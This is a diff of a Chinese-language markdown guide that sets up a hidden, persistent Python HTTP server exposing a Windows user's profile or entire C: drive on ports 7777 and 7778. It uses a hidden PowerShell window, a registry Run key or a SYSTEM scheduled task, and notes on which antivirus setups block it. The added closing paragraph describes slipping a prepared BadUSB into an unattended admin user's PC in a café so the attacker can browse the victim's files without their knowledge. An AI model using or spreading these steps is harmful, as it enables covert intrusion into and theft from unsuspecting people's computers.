@@ -47,7 +47,9 @@ pythonw -c "import sys,os;from http.server import HTTPServer,SimpleHTTPRequestHa
 ## 使電腦重啟時也跟著啟動指令
 
 在windows電腦中想要重啟之後可以開啟或執行命令<br>
-1. 加到 regedit(登錄編輯程式) 的 `電腦\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run` 當中，並且這不需用管理員權限，也因此只會作用當前的使用者(C:\Users\\[username])，而且這會有一個明顯的缺點，在使用者登入時會閃出一瞬間的powershell，雖然幾乎看不到powershell指令內容，但這難免會讓原使用者感到警覺
+1. 加到 regedit(登錄編輯程式) 的 `電腦\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run` 當中，加入regedit不需用管理員權限，不過如果python沒有存取網路的權限這麼做也沒有用，並且只會成功了也只能存取當前的使用者(C:\Users\\[username])，此外這會有一個缺點，在使用者登入時會閃出一瞬間的powershell，雖然幾乎看不到powershell指令內容，但這難免會讓原使用者感到警覺<br>
+
+這是一個矛盾，如果要 python 要存取網路權限，就需要管理員身分的允許，但是使用加入 regedit 的方式就是為了以防使用者不是管理員，不過我一開始想到這個方法時並不知道這點(python存取網路需要管理員允許)，總而言之這個方式基本上是沒有任何用處的，不過我還是將它陳列出來以供參考
 ```powershell
 # 將開啟 7778 端口展示 %userprofile% 的動作加到 regedit 
 # 如果python從來沒存取過網路，需要先讓他存取一次
@@ -59,7 +61,7 @@ $value = 'powershell.exe -WindowStyle Hidden -Command "Start-Process pythonw.exe
 Set-ItemProperty -Path $registryPath -Name $name -Value $value
 ```
 
-2. 加到 taskschd.msc(工作排程器) 中，讓電腦每次重啟或登入都執行工作內容，不過這就需要管理員權限了，也就是執行命令的使用者會是SYSTEM，不過如果當前使用者是管理員的情況下，加入taskschd不需要密碼，並且也不會被 Access Denied
+2. 加到 taskschd.msc(工作排程器) 中，讓電腦每次重啟或登入都執行工作內容，需要管理員權限，也就是執行命令的層級會是SYSTEM，不過如果當前使用者是管理員的情況下，可以直接使用一般powershell，加入到工作排程器不需要密碼，並且也不會被 Access Denied
 ```bash
 # 將動作加到工作排程器當中，使每次開啟電腦都自動執行命令，存取7777端口開啟伺服器展示C槽，需要管理員權限允許 python 存取網路、taskschd 和 管理員powershell 變更裝置
 # 1.找到python位置
@@ -90,6 +92,7 @@ Start-Process powershell -ArgumentList "-Command `"Set-ScheduledTask -TaskName '
 
 1. 需要有安裝全域 python 的主機才能這麼做，無論是安裝在 AppData 下或者 Program Files 都可以<br>
 2. 主機上除了 Windows 內建的 Windows Defender 防火牆之外沒有安裝其他防毒軟體(因為大多數防毒軟體會無條件封鎖而不是先詢問)<br>
+3. 當前使用者是管理員
 
 ## 需要檢查的狀況
 
@@ -103,3 +106,5 @@ python --version   # 確認python是否能用
 ```
 
 如果在試跑server時能夠成功，但用另外的裝置連接該主機ip的7777時連不上，大概率是因為主機上有除了 Windows Defender 之外的防毒軟體正在阻擋來自外來的請求，這個要能夠瞬間解決就有點難了(需要找到是哪個防毒軟體然後手動設定排除規則)<br>
+
+試想一下，有一位幾乎不用一般使用者而是把管理員當作平日使用帳戶的上班族，同時他的電腦上還安裝了python並設置了全域路徑，又很巧的他安全意識很低沒安裝任何防毒軟體，只有原生的windows defender，你作在咖啡廳的角落，手裡拿著已經寫好程序的BadUSB，等到他走開去上廁所，你意識到有一分鐘的時間，不疾不徐的走到電腦旁邊，開始在powershell，然後將所有寫好的命令輸入在終端、允許python存取網路防火牆、允許工作排程器設定程序、允許管理員powershell執行加入到工作排程器的命令，這樣再在瀏覽器輸入剛剛電腦的ip:7777，你就能夠在本人幾乎察覺不到的情況下，檢視它C槽底下的所有檔案
